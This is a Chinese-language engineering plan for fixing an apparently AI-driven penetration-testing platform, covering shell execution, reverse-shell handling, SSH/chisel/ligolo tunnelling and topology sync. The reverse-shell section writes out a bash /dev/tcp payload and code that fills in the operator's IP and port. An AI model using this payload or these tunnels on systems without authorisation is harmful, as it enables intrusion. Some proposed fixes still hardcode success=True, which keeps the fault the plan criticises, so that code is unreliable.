# 🚨 AMP 全面修复计划 - 基于完整测试反馈

## 测试结论（3/10 可用性）

**当前状态**: "会写台账的半成品控制台"，不是"自主渗透测试平台"

**核心问题**: 
- Shell 层：假成功（命令没执行但返回 success）
- Tunnel 层：只能记账，不能启动
- 拓扑层：与实际状态脱节

---

## 🔴 P0 级问题（致命）

### 问题 1: Shell 假成功 - 命令没执行但返回 success

**现象**:
```python
execute_command("echo SIMPLE_PASS; whoami; pwd")
返回: success=True, exit_code=0, stdout=""

# 更严重的：副作用命令
execute_command("echo TEST > /tmp/test_file")
返回: success=True
# 但文件不存在！
```

**根本原因**:
- `child.sendline(command)` 发送了命令
- `child.expect(PROMPT_PATTERNS)` 等待提示符
- 但 `child.before` 可能为空（时序问题）
- 没有验证命令是否真正执行

**修复方案**:
```python
def execute(self, shell_id, command, timeout=30):
    child = self._sessions[shell_id]
    
    # 1. 清空缓冲区
    child.sendline('')
    try:
        child.expect(self.PROMPT_PATTERNS, timeout=2)
    except:
        pass
    
    # 2. 发送命令
    child.sendline(command)
    
    # 3. 等待命令回显（确认命令被接收）
    try:
        child.expect(re.escape(command), timeout=5)
    except:
        raise CommandExecutionFailed("Command not echoed - may not be sent")
    
    # 4. 等待提示符
    index = child.expect(self.PROMPT_PATTERNS, timeout=timeout)
    
    # 5. 获取输出
    output = child.before if child.before else ""
    
    # 6. 验证输出不为空（对于有输出的命令）
    if not output.strip() and command.strip():
        logger.warning(f"Command returned empty output: {command}")
    
    return CommandResult(
        stdout=self._clean_output(output, command),
        stderr="",
        exit_code=0,
        duration_ms=duration_ms,
        success=True
    )
```

---

### 问题 2: bash -li 仍然失败

**现象**:
```
bash -li 提示符：\x1b[01;32m\u@\h\x1b[00m:\x1b[01;34m\w\x1b[00m\$
execute_command() 返回: exit_code=-1
```

**根本原因**:
- 提示符太复杂，当前模式仍然匹配不到
- 需要更激进的策略

**修复方案**:
```python
# 策略 1: 禁用彩色提示符
def spawn_shell(self, shell_id, command="bash"):
    # 对于 bash，禁用彩色
    if 'bash' in command:
        command = "bash --norc --noprofile"
        # 或设置环境变量
        env = os.environ.copy()
        env['PS1'] = '$ '
        child = pexpect.spawn(command, env=env, ...)
    
# 策略 2: 更宽松的超时处理
def execute(self, shell_id, command, timeout=30):
    try:
        index = child.expect(self.PROMPT_PATTERNS, timeout=timeout)
    except pexpect.TIMEOUT:
        # 不要立即失败，尝试获取已有输出
        output = child.before if child.before else ""
        if output.strip():
            # 有输出，认为命令执行了
            return CommandResult(stdout=output, exit_code=0, success=True)
        raise
```

---

### 问题 3: Reverse Shell 完全不可用

**现象**:
- Payload: `bash -i >& /dev/tcp/0.0.0.0/45703 0>&1` ❌
- 连接后 execute_command 报 shell_died

**根本原因**:
1. Payload 中的 0.0.0.0 无效
2. Socket 接管逻辑有问题

**修复方案**:

```python
# 1. 修复 Payload 生成
def create_reverse_shell(self, name, listen_port, ...):
    # 获取本机 IP（非 0.0.0.0）
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    
    # 生成正确的 payload
    payload = f"bash -i >& /dev/tcp/{local_ip}/{listen_port} 0>&1"
    
    return {
        "payload": payload,
        "listen_address": f"{local_ip}:{listen_port}"
    }

# 2. 修复 Socket 接管
def attach_socket(self, shell_id, sock):
    import pexpect.fdpexpect
    
    # 设置 socket 为非阻塞
    sock.setblocking(True)
    sock.settimeout(30)
    
    # 使用 fdpexpect
    child = pexpect.fdpexpect.fdspawn(
        sock.fileno(),
        encoding='utf-8',
        codec_errors='ignore',
        timeout=30
    )
    
    # 不要立即 expect prompt，先发送一个回车
    child.sendline('')
    time.sleep(0.5)
    
    # 尝试匹配 prompt
    try:
        child.expect(self.PROMPT_PATTERNS, timeout=5)
    except:
        # 如果没有 prompt，也继续（可能是 non-interactive shell）
        pass
    
    self._sessions[shell_id] = child
```

---

## 🟡 P1 级问题（严重）

### 问题 4: Tunnel 启动失败

**现象**:
- chisel: `Chisel binary not found`
- ligolo: `Ligolo-ng binary not found`
- ssh: `Tunnel type SSH not supported`

**修复方案**:

#### 4.1 SSH Tunnel 实现

```python
# amp/core/tunnel/backends/ssh_backend.py

class SSHTunnelBackend:
    """SSH tunnel backend using paramiko."""
    
    def start(self, tunnel_id, config):
        import paramiko
        
        # 创建 SSH 客户端
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # 连接
        client.connect(
            hostname=config['remote_host'],
            port=config.get('ssh_port', 22),
            username=config.get('username'),
            password=config.get('password'),
            key_filename=config.get('key_file')
        )
        
        # 创建端口转发
        transport = client.get_transport()
        transport.request_port_forward(
            '', config['local_port'],
            config['remote_host'], config['remote_port']
        )
        
        self._clients[tunnel_id] = client
        return True
```

#### 4.2 工具依赖说明

```python
# amp/mcp/tools/tunnel_tools.py

async def create_tunnel(...):
    """Create tunnel.
    
    Tunnel Types and Requirements:
    
    1. SSH Tunnel (Recommended - No external binary needed)
       - Uses Python paramiko library
       - Requires SSH credentials (username/password or key)
       - Example:
         {
           "tunnel_type": "ssh",
           "remote_host": "192.168.1.100",
           "remote_port": 22,
           "username": "user",
           "password": "pass"  # or "key_file": "/path/to/key"
         }
    
    2. Chisel Tunnel (Requires chisel binary)
       - Download: https://github.com/jpillora/chisel/releases
       - Place in PATH or specify path in config:
         {
           "tunnel_type": "chisel",
           "config": {"binary_path": "/path/to/chisel"}
         }
    
    3. Ligolo-ng Tunnel (Requires ligolo-ng binary)
       - Download: https://github.com/nicocha30/ligolo-ng/releases
       - Place in PATH or specify path in config:
         {
           "tunnel_type": "ligolo",
           "config": {"binary_path": "/path/to/ligolo-ng"}
         }
    
    Note: For controlled nodes, use SSH tunnel as it requires no
    additional binaries on the AMP server.
    """
```

#### 4.3 二进制路径配置

```python
# amp/config.py

class TunnelSettings(BaseSettings):
    chisel_binary: str = "chisel"  # 默认从 PATH 查找
    ligolo_binary: str = "ligolo-ng"
    
    # 允许用户配置
    chisel_path: str | None = None
    ligolo_path: None = None
    
    def get_chisel_path(self):
        if self.chisel_path:
            return self.chisel_path
        # 尝试从 PATH 查找
        import shutil
        path = shutil.which(self.chisel_binary)
        if not path:
            raise TunnelError(
                f"Chisel binary not found. "
                f"Please install chisel or set chisel_path in config."
            )
        return path
```

---

### 问题 5: 拓扑层与 Tunnel 台账脱节

**现象**:
```
list_tunnels: 3 条
visualize_topology: total_tunnels=0
```

**根本原因**:
- 拓扑层没有从数据库读取 tunnel
- 只维护内存中的图结构

**修复方案**:

```python
# amp/core/network/graph.py

class NetworkGraph:
    def __init__(self, database):
        self.database = database
        self._graph = {}
    
    def sync_from_database(self):
        """Sync graph from database tunnels."""
        from amp.storage.schema import Tunnel
        
        tunnels = self.database.session.query(Tunnel).all()
        
        for tunnel in tunnels:
            # 添加节点
            if tunnel.local_host not in self._graph:
                self._graph[tunnel.local_host] = []
            
            # 添加边
            self._graph[tunnel.local_host].append({
                'target': tunnel.remote_host,
                'tunnel_id': tunnel.id,
                'status': tunnel.status
            })
    
    def get_stats(self):
        """Get topology stats from database."""
        self.sync_from_database()
        
        return {
            'total_tunnels': len(self.database.session.query(Tunnel).all()),
            'active_tunnels': len(self.database.session.query(Tunnel).filter_by(status='active').all()),
            'total_segments': len(self._graph)
        }
```

---

## 📋 修复优先级

### 立即修复（今天）

1. **Shell 假成功** - 添加命令回显验证
2. **Reverse Shell Payload** - 修复 0.0.0.0 问题
3. **SSH Tunnel 实现** - 添加基础实现

### 短期修复（1-2天）

4. **bash -li 兼容** - 禁用彩色或更宽松超时
5. **拓扑同步** - 从数据库读取状态
6. **工具说明** - 添加依赖说明文档

### 中期优化（3-5天）

7. **Chisel/Ligolo 路径配置** - 支持自定义路径
8. **命令执行验证** - 更严格的成功判定
9. **完整测试** - 覆盖所有场景

---

## 🎯 修复后的预期效果

| 功能 | 当前 | 修复后 |
|------|------|--------|
| Shell 执行 | 3/10 | 8/10 |
| bash -li | 0/10 | 7/10 |
| Reverse Shell | 0/10 | 7/10 |
| SSH Tunnel | 0/10 | 8/10 |
| 拓扑同步 | 2/10 | 8/10 |
| **整体可用性** | **3/10** | **7-8/10** |

---

**开始实施修复！**
